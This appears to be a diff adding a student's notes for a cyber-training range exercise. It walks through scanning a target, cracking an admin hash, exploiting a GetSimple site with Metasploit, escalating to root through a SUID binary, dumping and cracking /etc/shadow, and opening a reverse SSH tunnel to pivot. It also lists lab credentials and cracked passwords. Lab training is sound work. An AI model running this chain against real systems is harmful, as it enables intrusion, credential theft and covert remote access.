@@ -1,0 +1,90 @@
+CMT Working Notes
+________________________________________
+********** CMT Student Access **********
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+JUMP IP:
+10.50.11.122 CMT NSX_Nat_1 NAT rules Destination Address 
+
+Target IP:
+Donovia - 10.50.160.65 CMT Core General> Address
+
+cvte:cvte	attacker:password
+#ssh -J cvte@10.50.XX.XX attacker@172.24.23.101 -X	<--- Different from NMT files saved on NMT box will not be here.
+#ssh -J cvte@10.50.XX.XX attacker@172.24.23.102 -X      <--- Different from NMT files saved on NMT box will not be here.
+#ssh -J cvte@10.50.XX.XX attacker@172.24.23.103 -X
+#ssh -J cvte@10.50.XX.XX attacker@172.24.23.104 -X
+#ssh -J cvte@10.50.XX.XX attacker@172.24.23.105 -X
+
+atacker@kali$ ip a
+$sudodhclient eth0
+$nmap -sV -sT 10.50.X.X(targetIP) > Outward_Facing_Scan
+$ls
+$cat Outward_Facing_Scan
+
+*Notice 20,21,22,80,8080 ports
+
+$nikto -h 10.50.160.17:8080 > nikto_8080
+$cat nikto_8080 | grep "data"
+$cat nikto_8080 | grep "admin"
+
+$firefox
+$10.50.160.17:8080/admin
+$10.50.160.17:8080/data
+*Browser go to users and copy the hash
+$echo "hash" admin_hash.txt
+$john admin_hash.txt
+*pokemon
+*/data/other/pages.xml
+*Notice getsimple wesite and do OSR
+
+
+*msfconsole
+search getsimple
+use unauth
+set RHOSTS 10.50.160.17
+set RPORT 8080
+run/exploit
+might have to resend 
+
+*meterpreter>
+download shadow
+download passwd
+
+shell
+whoami
+Shell stabilization:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+find / -user root -perm -4000 2>/dev/null
+env /bin/sh
+whoami
+#we have root!
+
+ip a
+should show you 172.17.7.80
+cat /etc/shadow and copy the users
+cat /etc/passwd and copy the users
+
+*Other window on attacker 
+attacker@kali$
+nano shadow_17_7_80
+paste the shadow info and save
+nano passwd_17_7_80
+paste the passwd info and save
+
+unshadow shadow_17_7_80 passwd_17_7_80 > unshadowed_80
+john unshadowed_80
+
+relsalih:123123
+teljalal:112233
+neltaha:Matrix
+arazzaqqa:creame1
+selsalad:12866
+
+from msfconsole open a reverse ssh tunnel
+ssh -R 7777:localhost:22 attacker@10.50.X.X
+
+minimize the terminal and DONT TOUCH IT 
+
+*****Open a new terminal and using that reverse ssh connection access the .80
+ssh neltaha@localhost -p 7777
